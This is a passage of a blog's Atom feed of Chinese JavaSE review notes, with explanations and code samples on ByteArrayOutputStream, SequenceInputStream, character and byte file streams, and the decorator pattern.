class="line"><span class="comment">//写入到内存输出流</span></span><br><span class="line">     &#125;</span><br><span class="line">     System.out.<span class="built_in">println</span>(baos.toString(<span class="string">"gbk"</span>));</span><br><span class="line">     fis.<span class="built_in">close</span>();</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;内存输出流的概述&quot;&gt;&lt;a href=&quot;#内存输出流的概述&quot; class=&quot;headerlink&quot; title=&quot;内存输出流的概述&quot;&gt;&lt;/a&gt;内存输出流的概述&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;该输出流可以&lt;code&gt;向内存中写数据&lt;/code&gt;，把内存当作一个缓冲区，写出之后可以一次性获取出所有数据。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;内存输出流类&lt;blockquote&gt;
&lt;p&gt;ByteArrayOutputStream&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;ps：它其实是一个缓冲区，实例化这个类时在内存中创建了一个可以增长的字节数组，所以它可以不用关闭流，因为&lt;code&gt;根本就只是个缓冲区&lt;/code&gt;。&lt;/p&gt;
    
    </summary>
    
      <category term="JavaSE 复习" scheme="http://liuhaoan.github.io/categories/JavaSE-%E5%A4%8D%E4%B9%A0/"/>
    
    
      <category term="IO流" scheme="http://liuhaoan.github.io/tags/IO%E6%B5%81/"/>
    
      <category term="内存输出流" scheme="http://liuhaoan.github.io/tags/%E5%86%85%E5%AD%98%E8%BE%93%E5%87%BA%E6%B5%81/"/>
    
      <category term="内存输出流面试题" scheme="http://liuhaoan.github.io/tags/%E5%86%85%E5%AD%98%E8%BE%93%E5%87%BA%E6%B5%81%E9%9D%A2%E8%AF%95%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>javaSE复习之——IO流_序列流</title>
    <link href="http://liuhaoan.github.io/2019/04/10/javaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94IO%E6%B5%81-%E5%BA%8F%E5%88%97%E6%B5%81/"/>
    <id>http://liuhaoan.github.io/2019/04/10/javaSE复习之——IO流-序列流/</id>
    <published>2019-04-10T08:24:36.000Z</published>
    <updated>2019-04-10T08:27:35.545Z</updated>
    
    <content type="html"><![CDATA[<h1 id="序列流概述"><a href="#序列流概述" class="headerlink" title="序列流概述"></a>序列流概述</h1><blockquote><p>序列流可以把<code>多个字节输入流整合成一个</code>，从序列流中读取数据时，将从被整合的第一个流开始读，然后依次往后读，也就是把<code>N个流合成成一个流</code>，这样方便操作。 </p></blockquote><a id="more"></a><ul><li>序列流类<blockquote><p>SequenceInputStream</p></blockquote></li></ul><h3 id="两个流合并序列代码示例"><a href="#两个流合并序列代码示例" class="headerlink" title="两个流合并序列代码示例"></a>两个流合并序列代码示例</h3><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SequenceInputStream sis = <span class="keyword">new</span> <span class="type">SequenceInputStream</span>(FileInputStream, FileInputStream)；</span><br></pre></td></tr></table></figure><h3 id="N个流合并序列代码示例"><a href="#N个流合并序列代码示例" class="headerlink" title="N个流合并序列代码示例"></a>N个流合并序列代码示例</h3><ul><li>ps：<blockquote><p>因为需要N个流合并的话，那么SequenceInputStream 构造方法就需要传入一个流的枚举，而Vector集合中有一个方法elements使返回一个枚举，所以我们可以使用集合，<code>把流对象先放在集合中，然后再获取这个集合的枚举</code>，最后传给SequenceInputStream 构造方法。</p></blockquote></li></ul><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Vector&lt;FileInputStream&gt; v = <span class="keyword">new</span> <span class="type">Vector</span>&lt;&gt;();</span><br><span class="line">v.add(<span class="keyword">new</span> <span class="type">FileInputStream</span>(<span class="string">"a.txt"</span>));</span><br><span class="line">v.add(<span class="keyword">new</span> <span class="type">FileInputStream</span>(<span class="string">"b.txt"</span>));</span><br><span class="line">v.add(<span class="keyword">new</span> <span class="type">FileInputStream</span>(<span class="string">"c.txt"</span>));</span><br><span class="line">SequenceInputStream sis = <span class="keyword">new</span> <span class="type">SequenceInputStream</span>(v.elements());</span><br><span class="line">FileOutputStream fos = <span class="keyword">new</span> <span class="type">FileOutputStream</span>(<span class="string">"abc.txt"</span>);</span><br><span class="line">int t;</span><br><span class="line"><span class="keyword">while</span> ((t = sis.read()) != <span class="number">-1</span>) &#123;</span><br><span class="line">    fos.write(t);</span><br><span class="line">&#125;</span><br><span class="line">fos.close();</span><br><span class="line">sis.close();</span><br></pre></td></tr></table></figure><ul><li>使用场景1：<blockquote><p>当我们需要读取两个文件，并且需要把两个文件整合成一个文件时，不使用序列流就会使代码不简洁，使用序列流就只要操作序列流即可。</p></blockquote></li><li>使用场景2<blockquote><p>如果想把两个MP3合成成一个MP3就可以用到，这样就会播放完第一个直接播放下一个。</p></blockquote></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;序列流概述&quot;&gt;&lt;a href=&quot;#序列流概述&quot; class=&quot;headerlink&quot; title=&quot;序列流概述&quot;&gt;&lt;/a&gt;序列流概述&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;序列流可以把&lt;code&gt;多个字节输入流整合成一个&lt;/code&gt;，从序列流中读取数据时，将从被整合的第一个流开始读，然后依次往后读，也就是把&lt;code&gt;N个流合成成一个流&lt;/code&gt;，这样方便操作。 &lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="JavaSE 复习" scheme="http://liuhaoan.github.io/categories/JavaSE-%E5%A4%8D%E4%B9%A0/"/>
    
    
      <category term="IO流" scheme="http://liuhaoan.github.io/tags/IO%E6%B5%81/"/>
    
      <category term="序列流" scheme="http://liuhaoan.github.io/tags/%E5%BA%8F%E5%88%97%E6%B5%81/"/>
    
  </entry>
  
  <entry>
    <title>javaSE复习之——设计模式_装饰设计模式</title>
    <link href="http://liuhaoan.github.io/2019/04/10/javaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E8%A3%85%E9%A5%B0%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"/>
    <id>http://liuhaoan.github.io/2019/04/10/javaSE复习之——设计模式-装饰设计模式/</id>
    <published>2019-04-10T08:21:47.000Z</published>
    <updated>2019-04-10T08:23:56.225Z</updated>
    
    <content type="html"><![CDATA[<h1 id="装饰设计模式代码示例"><a href="#装饰设计模式代码示例" class="headerlink" title="装饰设计模式代码示例"></a>装饰设计模式代码示例</h1><a id="more"></a><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title">Coder</span> &#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">code</span>(<span class="params"></span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title">Student</span> <span class="title">implements</span> <span class="title">Coder</span> &#123;</span><br><span class="line"></span><br><span class="line">@Override</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">code</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">System.<span class="keyword">out</span>.println(<span class="string">"javase"</span>);</span><br><span class="line">System.<span class="keyword">out</span>.println(<span class="string">"javaweb"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title">HeiMaStudent</span> <span class="title">implements</span> <span class="title">Coder</span> &#123;</span><br><span class="line"><span class="comment">//1,获取被装饰类的引用</span></span><br><span class="line"><span class="keyword">private</span> Student s;</span><br><span class="line"><span class="comment">//获取学生引用</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//2,在构造方法中传入被装饰类的对象</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">HeiMaStudent</span>(<span class="params">Student s</span>)</span> &#123;</span><br><span class="line"><span class="keyword">this</span>.s = s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//3,对原有的功能进行升级</span></span><br><span class="line">@Override</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">code</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">s.code();</span><br><span class="line">System.<span class="keyword">out</span>.println(<span class="string">"ssh"</span>);</span><br><span class="line">System.<span class="keyword">out</span>.println(<span class="string">"数据库"</span>);</span><br><span class="line">System.<span class="keyword">out</span>.println(<span class="string">"大数据"</span>);</span><br><span class="line">System.<span class="keyword">out</span>.println(<span class="string">"..."</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="装饰设计模式的好处"><a href="#装饰设计模式的好处" class="headerlink" title="装饰设计模式的好处"></a>装饰设计模式的好处</h3><blockquote><p>耦合性不强,被装饰的类的变化与装饰类的变化无关</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;装饰设计模式代码示例&quot;&gt;&lt;a href=&quot;#装饰设计模式代码示例&quot; class=&quot;headerlink&quot; title=&quot;装饰设计模式代码示例&quot;&gt;&lt;/a&gt;装饰设计模式代码示例&lt;/h1&gt;
    
    </summary>
    
      <category term="JavaSE 复习" scheme="http://liuhaoan.github.io/categories/JavaSE-%E5%A4%8D%E4%B9%A0/"/>
    
    
      <category term="设计模式" scheme="http://liuhaoan.github.io/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"/>
    
      <category term="装饰设计模式" scheme="http://liuhaoan.github.io/tags/%E8%A3%85%E9%A5%B0%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"/>
    
  </entry>
  
  <entry>
    <title>javaSE复习之——IO流_字符流</title>
    <link href="http://liuhaoan.github.io/2019/04/10/javaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94IO%E6%B5%81-%E5%AD%97%E7%AC%A6%E6%B5%81/"/>
    <id>http://liuhaoan.github.io/2019/04/10/javaSE复习之——IO流-字符流/</id>
    <published>2019-04-10T08:05:27.000Z</published>
    <updated>2019-04-10T08:19:05.316Z</updated>
    
    <content type="html"><![CDATA[<h1 id="字符流概述"><a href="#字符流概述" class="headerlink" title="字符流概述"></a>字符流概述</h1><blockquote><p>读写字符的IO流，字符流读取字符，需要先读取到字节数据，然后转为字符，如果要写出字符，需要把字符转为字节再写出</p><ul><li>ps：<br>字符流除了读取字符、不能拷贝非纯文本文件，其他功能都和字节流差不多，因为它底层就用到了FileInputStream与FileOutputStream</li></ul></blockquote><a id="more"></a><h3 id="字符流的继承体系："><a href="#字符流的继承体系：" class="headerlink" title="字符流的继承体系："></a>字符流的继承体系：</h3><ul><li><p>Reader</p><ul><li><p>InputStreamReader</p><blockquote><p>它是字节流通向字符流的桥梁，可用用它指定码表</p></blockquote><ul><li>FlieReader<blockquote><p>文件字符输入流类</p></blockquote></li></ul></li><li><p>BufferedRead</p><blockquote><p>封装的缓冲区的输入流，它可以传入InputStreamReader</p></blockquote><ul><li>LineNumberReader</li></ul></li></ul></li></ul><ul><li><p>Writer</p><ul><li><p>InputStreamWrite</p><blockquote><p>它是字符流通向字节流的桥梁，可以用它指定码表</p></blockquote><ul><li>FileWrider    <blockquote><p>文件字符输出流类</p></blockquote></li></ul></li><li><p>BufferedWriter</p><blockquote><p>封装的缓冲区的输出流，它可以传入InputStreamWrite</p></blockquote></li></ul></li></ul><h3 id="字符流读取字符原理"><a href="#字符流读取字符原理" class="headerlink" title="字符流读取字符原理"></a>字符流读取字符原理</h3><blockquote><p>读取到字节数据通过码表（gbk、utf-8等），一次读取一个字符</p><ul><li>ps：<br>汉字的码表前第一个字节一定是负数</li></ul></blockquote><h3 id="写出字符流时的注意事项"><a href="#写出字符流时的注意事项" class="headerlink" title="写出字符流时的注意事项"></a>写出字符流时的注意事项</h3><blockquote><p>1、写出字符流后<code>一定要关流</code>，否则不会写出去，因为字符流底层因为需要<code>先读取字节流然后通过码表读取文件内的字节</code>，所以他会创建一个缓冲区，当然这个缓冲区<code>只能用作字节与码表的转换</code>。</p><p>2、只能拷贝纯文本文件，不可以拷贝非纯文本文件，因为在读的时候会将<code>字节转换为字符</code>，在转换过程中遇到找不到码表上的对应字符就会用？代替，这样写出的话会把？也写出去，这样文件就损坏了。</p><p>3、在使用BufferedWrite创建字符输出流时，第二个参数不传入true则不清空文件中原来的数据</p></blockquote><h3 id="什么情况下使用字符流？"><a href="#什么情况下使用字符流？" class="headerlink" title="什么情况下使用字符流？"></a>什么情况下使用字符流？</h3><blockquote><p>1、字符流可以拷贝文本文件，但是不推荐使用，因为读取时会把字节转换成字符，写出时还要把字符转换成字节，这样会大大的影响效率。</p><p>2、程序需要读取一段文本，或者写出一段文本的时候可以使用</p><p>3、读取的时候是按照字符大小读取的，所以不会出现半个中文等</p><p>4、写的时候可以直接将字符串写出，不需要转换为字节数组</p></blockquote><h3 id="字符流中Buffered封装类的特殊方法："><a href="#字符流中Buffered封装类的特殊方法：" class="headerlink" title="字符流中Buffered封装类的特殊方法："></a>字符流中Buffered封装类的特殊方法：</h3><ul><li><p>.readLine()</p><blockquote><p>读取一个文本行返回String，也就是读一行，此方法<code>遇到\r或者\n就认为某行已经终止</code>，它没有任何终止符，只要没数据了就返回null</p></blockquote></li><li><p>.newLine()    </p><blockquote><p>写出一个回车换行符，配合readLine使用，因为readLine是获取每行，而不会有换行，所以需要newLine换行。</p></blockquote></li><li><p>newLine与\r\n的区别</p><blockquote><p>1、newLine是跨平台的方法，</p><p>2、\r\n只支持windows系统</p></blockquote></li></ul><h3 id="BufferedReader子类LineNumberReader的特殊方法"><a href="#BufferedReader子类LineNumberReader的特殊方法" class="headerlink" title="BufferedReader子类LineNumberReader的特殊方法"></a>BufferedReader子类<code>LineNumberReader</code>的特殊方法</h3><ul><li>.getLineNumber()<blockquote><p>获取当前行号</p></blockquote></li><li>.setLineNumber()<blockquote><p>设置行号，放在遍历获取文本前可以起到初始行号的作用</p></blockquote></li></ul><h3 id="使用指定码表读写字符"><a href="#使用指定码表读写字符" class="headerlink" title="使用指定码表读写字符"></a>使用指定码表读写字符</h3><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">InputStreamReader isr = <span class="keyword">new</span> <span class="type">InputStreamReader</span>(<span class="keyword">new</span> <span class="type">FileInputStream</span>(<span class="number">1.</span>txt, <span class="string">"utf-8"</span>));</span><br><span class="line">BufferedReader br = <span class="keyword">new</span> <span class="type">BufferedReader</span>(<span class="keyword">new</span> <span class="type">InputStreamReader</span>(<span class="keyword">new</span> <span class="type">FileInputStream</span>(<span class="string">"1.txt"</span>), <span class="string">"gbk"</span>));</span><br><span class="line"><span class="comment">//带buffered的</span></span><br></pre></td></tr></table></figure><p>ps:写出字符流同理。</p><h3 id="面试题之——获取文本上每个字符出现的次数"><a href="#面试题之——获取文本上每个字符出现的次数" class="headerlink" title="面试题之——获取文本上每个字符出现的次数"></a>面试题之——获取文本上每个字符出现的次数</h3><ul><li>思路<blockquote><p>1、创建输入流读取文本</p><p>2、创建map集合保存每个字符出现的次数</p><p>3、遍历输入流文本，然后判断每一个字符存入map集合，有相同的那就value加一，没有就加入并且value为1</p><p>4、创建输出流</p><p>5、遍历集合，把集合输出到文本</p><p>6、关闭流</p></blockquote></li></ul><h3 id="代码示例："><a href="#代码示例：" class="headerlink" title="代码示例："></a>代码示例：</h3><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">    BufferedReader br = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(<span class="keyword">new</span> FileInputStream(<span class="string">"1.txt"</span>), <span class="string">"gbk"</span>));</span><br><span class="line">    HashMap&lt;Character, Integer&gt; hm = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    <span class="keyword">int</span> c;</span><br><span class="line">    <span class="built_in">while</span> ((c = br.<span class="built_in">read</span>()) != <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">char</span> ch = (<span class="keyword">char</span>)c;</span><br><span class="line">        hm.<span class="built_in">put</span>( ch, hm.containsKey(ch) ? hm.<span class="built_in">get</span>(ch) + <span class="number">1</span> : <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    br.<span class="built_in">close</span>();</span><br><span class="line"></span><br><span class="line">    BufferedWriter bw = <span class="keyword">new</span> BufferedWriter(<span class="keyword">new</span> OutputStreamWriter(<span class="keyword">new</span> FileOutputStream(<span class="string">"2.txt"</span>), <span class="string">"gbk"</span>));</span><br><span class="line">    <span class="built_in">for</span>(Character me : hm.keySet()) &#123;</span><br><span class="line">        <span class="built_in">switch</span> (me) &#123;</span><br><span class="line">            <span class="built_in">case</span> <span class="string">'\t'</span> : bw.<span class="built_in">write</span>(<span class="string">"\\t="</span> + hm.<span class="built_in">get</span>(me));<span class="built_in">break</span>;</span><br><span class="line">            <span class="built_in">case</span> <span class="string">'\n'</span> : bw.<span class="built_in">write</span>(<span class="string">"\\n="</span> + hm.<span class="built_in">get</span>(me));<span class="built_in">break</span>;</span><br><span class="line">            <span class="built_in">case</span> <span class="string">'\r'</span> : bw.<span class="built_in">write</span>(<span class="string">"\\r="</span> + hm.<span class="built_in">get</span>(me));<span class="built_in">break</span>;</span><br><span class="line">            <span class="built_in">default</span>:bw.<span class="built_in">write</span>(me + <span class="string">"="</span> + hm.<span class="built_in">get</span>(me));</span><br><span class="line">        &#125;</span><br><span class="line">        bw.newLine();</span><br><span class="line">    &#125;</span><br><span class="line">    bw.<span class="built_in">close</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;字符流概述&quot;&gt;&lt;a href=&quot;#字符流概述&quot; class=&quot;headerlink&quot; title=&quot;字符流概述&quot;&gt;&lt;/a&gt;字符流概述&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;读写字符的IO流，字符流读取字符，需要先读取到字节数据，然后转为字符，如果要写出字符，需要把字符转为字节再写出&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ps：&lt;br&gt;字符流除了读取字符、不能拷贝非纯文本文件，其他功能都和字节流差不多，因为它底层就用到了FileInputStream与FileOutputStream&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="JavaSE 复习" scheme="http://liuhaoan.github.io/categories/JavaSE-%E5%A4%8D%E4%B9%A0/"/>
    
    
      <category term="字符流" scheme="http://liuhaoan.github.io/tags/%E5%AD%97%E7%AC%A6%E6%B5%81/"/>
    
      <category term="IO流" scheme="http://liuhaoan.github.io/tags/IO%E6%B5%81/"/>
    
      <category term="获取文本上每个字符出现的次数面试题" scheme="http://liuhaoan.github.io/tags/%E8%8E%B7%E5%8F%96%E6%96%87%E6%9C%AC%E4%B8%8A%E6%AF%8F%E4%B8%AA%E5%AD%97%E7%AC%A6%E5%87%BA%E7%8E%B0%E7%9A%84%E6%AC%A1%E6%95%B0%E9%9D%A2%E8%AF%95%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>javaSE复习之——IO流_文件字节流</title>
    <link href="http://liuhaoan.github.io/2019/04/10/javaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94IO%E6%B5%81-%E6%96%87%E4%BB%B6%E5%AD%97%E8%8A%82%E6%B5%81/"/>
    <id>http://liuhaoan.github.io/2019/04/10/javaSE复习之——IO流-文件字节流/</id>
    <published>2019-04-10T07:14:55.000Z</published>
    <updated>2019-04-10T07:59:36.745Z</updated>
    
    <content type="html"><![CDATA[<h1 id="FileInputStream概述"><a href="#FileInputStream概述" class="headerlink" title="FileInputStream概述"></a>FileInputStream概述</h1><blockquote><p>它是一个输入流，它的作用是从文件系统中的某个文件中获得输入字节，它是<code>InputStream</code>的子类</p></blockquote><h3 id="创建一个文件输入流"><a href="#创建一个文件输入流" class="headerlink" title="创建一个文件输入流"></a>创建一个文件输入流</h3><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FileInputStream fis = <span class="keyword">new</span> <span class="type">FileInputStream</span>(<span class="string">"1.txt"</span>);</span><br><span class="line"><span class="comment">//其实就是创建一个流的对象，不用了关闭即可</span></span><br></pre></td></tr></table></figure><a id="more"></a><h3 id="IO文件输入流的方法"><a href="#IO文件输入流的方法" class="headerlink" title="IO文件输入流的方法"></a>IO文件输入流的方法</h3><ul><li>.read()<blockquote><p>从输入流读取下一个字节返回这个字节的int值，文件结束标记是-1，也就是读到-1就读完这个文件了。</p></blockquote></li><li>.read(arr)    <blockquote><p>从输入流读取字节存到arr数组中，也就是内存中，返回读取到的字节数</p></blockquote></li><li>.available()<blockquote><p>获取可以读的剩余字节数</p></blockquote></li></ul><h3 id="为什么read（）方法读取一个字节返回的是int而不是字节类型的byte？"><a href="#为什么read（）方法读取一个字节返回的是int而不是字节类型的byte？" class="headerlink" title="为什么read（）方法读取一个字节返回的是int而不是字节类型的byte？"></a>为什么<code>read（）</code>方法读取一个字节返回的是int而不是字节类型的byte？</h3><ul><li>解答：<blockquote><p>一个字节等于8个二进制位，也就是<code>-1的二进制位补码是1111 1111</code>，然后文件的底层都是以二进制形式存储的，这些文件的二进制中难免中途会遇到某个字节是1111 1111（八个一），如果read方法直接返回byte的话那么遇到这种情况就直接停止读取文件了，为了解决这个问题就直接返回int而不直接返回byte，因为在Java中一个int数据占4个字节，<code>也就是占32个二进制位</code>，而read方法中从文件读取一个字节就在其<code>二进制位前面加上24个0让其组成一个int类型数据返回</code>，这样就返回了一个255而不是返回1了，这样就可以保证数据的完整，而文件结束标记的-1它本身就是整数型所以不会受到影响。当然在使用输出流输出文件时write方法会<code>自动去除int前面的24个零</code>。</p></blockquote></li></ul><h1 id="FileOutputStream的概述"><a href="#FileOutputStream的概述" class="headerlink" title="FileOutputStream的概述"></a>FileOutputStream的概述</h1><blockquote><p>它是一个输出流，它的作用将指定字节写入此文件输出流，它是OutputStream的子类</p></blockquote><h3 id="输出流注意事项"><a href="#输出流注意事项" class="headerlink" title="输出流注意事项"></a>输出流注意事项</h3><blockquote><p>1、输入流指定的文件不存在会报错，而输出流却不会，它是直接创建这个文件</p><p>2、虽然写出的是一个int类型的数据，但其实write方法会自动去除int数据的前3个8位2进制位</p><p>3、如果文件存在，那么就会先将文件内容清空，如果不要让他清空要追加，那么就在创建对象时第二个参数传入一个true</p><ul><li>例子：<figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FileOutputStream fos = <span class="keyword">new</span> <span class="type">FileOutputStream</span>(<span class="string">"1.txt"</span>, <span class="literal">true</span>);</span><br></pre></td></tr></table></figure></li></ul></blockquote><h3 id="IO文件输出流的方法"><a href="#IO文件输出流的方法" class="headerlink" title="IO文件输出流的方法"></a>IO文件输出流的方法</h3><ul><li>.write()<blockquote><p>将指定字节写入此文件输出流</p></blockquote></li><li>.write(arr)<blockquote><p>将arr数组中的字节写到文件中</p></blockquote></li><li>.write(arr, off, len)<blockquote><p>off为数组起始偏移量，也就是起始索引，通常0、len就是要写入数据的总长度    </p></blockquote></li></ul><h3 id="利用IO流进行文件拷贝例程之——缓冲区拷贝（单纯拷贝时推荐，中间需要对数据进行处理则使用带Buffered的封装类）"><a href="#利用IO流进行文件拷贝例程之——缓冲区拷贝（单纯拷贝时推荐，中间需要对数据进行处理则使用带Buffered的封装类）" class="headerlink" title="利用IO流进行文件拷贝例程之——缓冲区拷贝（单纯拷贝时推荐，中间需要对数据进行处理则使用带Buffered的封装类）"></a>利用IO流进行文件拷贝例程之——<code>缓冲区拷贝</code>（单纯拷贝时推荐，中间需要对数据进行处理则使用带Buffered的封装类）</h3><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">FileInputStream fis = <span class="keyword">new</span> FileInputStream(<span class="string">"致青春.mp3"</span>);</span><br><span class="line"><span class="comment">//创建输入流对象,关联致青春.mp3</span></span><br><span class="line"></span><br><span class="line">FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">"copy.mp3"</span>);</span><br><span class="line"><span class="comment">//创建输出流对象,关联copy.mp3</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//int len = fis.available();</span></span><br><span class="line"><span class="comment">//System.out.println(len);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">byte</span>[] arr = <span class="keyword">new</span> <span class="keyword">byte</span>[fis.<span class="built_in">available</span>()];</span><br><span class="line"><span class="comment">//创建与文件一样大小的字节数组</span></span><br><span class="line"></span><br><span class="line">fis.<span class="built_in">read</span>(arr);</span><br><span class="line"><span class="comment">//将文件上的字节读取到内存中</span></span><br><span class="line"></span><br><span class="line">fos.<span class="built_in">write</span>(arr);</span><br><span class="line"><span class="comment">//将字节数组中的字节数据写到文件上</span></span><br><span class="line"></span><br><span class="line">fis.<span class="built_in">close</span>();</span><br><span class="line">fos.<span class="built_in">close</span>();</span><br></pre></td></tr></table></figure><p>ps：不推荐使用，因为一次性把所有字节都读下来放在内存中会导致占用内存过多，如果操作的是一个蓝光电影，就会<code>内存溢出</code>。</p><ul><li>解决方法：<blockquote><p>一次处理一部分数据，分批次处理即可，代码如下</p></blockquote></li></ul><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">      <span class="keyword">byte</span> b[] = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">8192</span>];</span><br><span class="line"><span class="comment">//缓冲区一定要为1024的整数倍</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">int</span> len;</span><br><span class="line">      <span class="built_in">while</span> ((len = fis.<span class="built_in">read</span>(b)) != <span class="number">-1</span>) &#123;</span><br><span class="line">          fos.<span class="built_in">write</span>(b, <span class="number">0</span>, len);</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><h3 id="利用IO流进行文件拷贝例程二之——普通拷贝"><a href="#利用IO流进行文件拷贝例程二之——普通拷贝" class="headerlink" title="利用IO流进行文件拷贝例程二之——普通拷贝"></a>利用IO流进行文件拷贝例程二之——<code>普通拷贝</code></h3><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">FileInputStream fis = <span class="keyword">new</span> FileInputStream(<span class="string">"致青春.mp3"</span>);</span><br><span class="line"><span class="comment">//创建输入流对象,关联致青春.mp3</span></span><br><span class="line"></span><br><span class="line">FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">"copy.mp3"</span>);</span><br><span class="line"><span class="comment">//创建输出流对象,关联copy.mp3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> b;</span><br><span class="line"><span class="comment">//在不断的读取每一个字节</span></span><br><span class="line"><span class="built_in">while</span>((b = fis.<span class="built_in">read</span>()) != <span class="number">-1</span>) &#123;</span><br><span class="line">fos.<span class="built_in">write</span>(b);</span><br><span class="line"><span class="comment">//将每一个字节写出</span></span><br><span class="line">&#125;</span><br><span 